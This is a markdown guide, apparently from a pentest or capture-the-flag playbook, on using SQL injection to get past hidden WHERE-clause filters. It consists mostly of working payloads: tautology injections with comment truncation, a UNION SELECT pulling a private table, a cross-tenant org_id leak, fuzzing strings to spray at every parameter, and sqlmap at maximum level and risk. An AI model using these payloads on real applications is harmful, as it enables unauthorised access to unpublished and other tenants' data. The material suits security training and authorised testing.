# WHERE-Clause Filter Bypass

## When this applies

- App injects a fixed boolean filter into the query (e.g. `published=1`, `is_visible=1`, `user_id=session_id`) to hide rows.
- You can inject into a parameter that becomes part of the WHERE clause (`category`, `filter`, `tag`, `id`).
- Goal is to retrieve hidden/unpublished/cross-tenant rows that the filter normally excludes.

## Technique

Inject a tautology that nullifies the hidden filter — typically by adding `OR 1=1` after closing the original filter context, or by commenting out the trailing AND filter altogether.

## Steps

### 1. Identify the hidden filter

Read source code if available. Otherwise, observe behavior: a category page that shows 5 results when there are clearly more in the database is a hint that `published=1` (or similar) is silently appended.

```sql
-- Likely query:
SELECT * FROM products WHERE category='Gifts' AND released=1
```

### 2. OR-injection to negate the filter

```
GET /?category=' OR '1'='1
```

Resulting query:
```sql
SELECT * FROM products WHERE category='' OR '1'='1' AND released=1
```

`AND` binds tighter, so this becomes `(category='') OR ('1'='1' AND released=1)` — still filters by `released=1`. Need explicit parentheses or comment-truncation:

```
GET /?category=Gifts'+OR+1=1--
```

Resulting query:
```sql
SELECT * FROM products WHERE category='Gifts' OR 1=1--' AND released=1
```

`--` truncates the trailing `AND released=1`, returning ALL rows (including unpublished).

### 3. UNION-based extraction of hidden table

```
GET /?category=Gifts'+UNION+SELECT+NULL,title,body+FROM+private_posts--
```

Pull data from a separate table the user shouldn't see at all.

### 4. Multi-tenant leak

If the app uses `WHERE org_id=<session.org_id>`, you can sometimes inject:

```
GET /?org_id=1+OR+1=1--
```

Or with quote context:
```
GET /?filter='+OR+1=1--
```

Returns rows from all tenants.

### 5. Test EVERY parameter

Hidden filters often live on parameters that look harmless: `sort`, `order_by`, `lang`, `region`, `tag`. Don't focus only on `id` or `username`. Spray each parameter with `'`, `"`, `1' OR '1'='1`, `1) OR (1=1--` and watch for response changes (different row counts, errors, layout shifts).

## Verifying success

- Result set size grows beyond the visible default (e.g. 5 → 50 rows).
- Hidden/unpublished/secret rows appear in the response (titles like "DRAFT", "INTERNAL", "SECRET").
- The flag/sensitive content is now in the response body.

## Common pitfalls

- Forgetting to close the original quote — leads to syntax error rather than tautology.
- Operator precedence trips up `OR` injections: `'X' OR 1=1 AND y=1` is not what you think. Use parentheses or comment-truncation.
- Some apps wrap parameters in `()` so you need `1) OR (1=1--`.
- LIMIT clauses still constrain output: `WHERE filter --` may return all rows but the app paginates to 10.
- ORDER BY may also be appended; rare but possible to leak data via injected ORDER BY column reference.

## Tools

- Manual fuzzing in Burp Repeater across every parameter.
- sqlmap `--level=5 --risk=3` to test all params with full payload set.
- Source-code review (always faster than blind fuzzing if accessible).
